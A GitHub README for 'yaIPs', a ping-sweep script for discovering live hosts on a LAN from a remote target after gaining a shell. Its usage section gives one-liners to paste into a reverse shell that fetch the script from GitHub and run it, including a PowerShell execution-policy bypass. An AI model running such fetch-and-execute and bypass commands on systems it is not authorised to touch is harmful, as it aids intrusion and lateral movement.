# yaIPs - Yet another ipsweeping script 
Just like any other IPSweep script, yaIPs.sh and yaIPs.ps1 sends ICMP packets to the entire current LAN. As soon as 
I had a shell to the remote target, I wanted to identify all reachable IPv4 addresses as quick as 
possible. It's just easiest if I process the current address right away instead of manually disassembling 
it and specifying it as an argument. Of course, sometimes this is also needed, so I can simply specify 
the desired network potion as the first parameter. 

# Usage
- Paste this into your reverse shell:

`Linux`:
```bash
wget https://raw.githubusercontent.com/fhAnso/yaIPs/main/yaIPs.sh && bash yaIPs.sh
```
- or:
```bash
curl https://raw.githubusercontent.com/fhAnso/yaIPs/main/yaIPs.sh && bash yaIPs.sh
```
`Windows`:
```powershell
curl https://raw.githubusercontent.com/fhAnso/yaIPs/main/yaIPs.ps1 > yaIPs.ps1 && powershell -executionpolicy bypass -File .\yaIPs.ps1
```

# LICENSE

These scripts are published under the [MIT](https://github.com/fhAnso/yaIPs/blob/main/LICENSE) license.
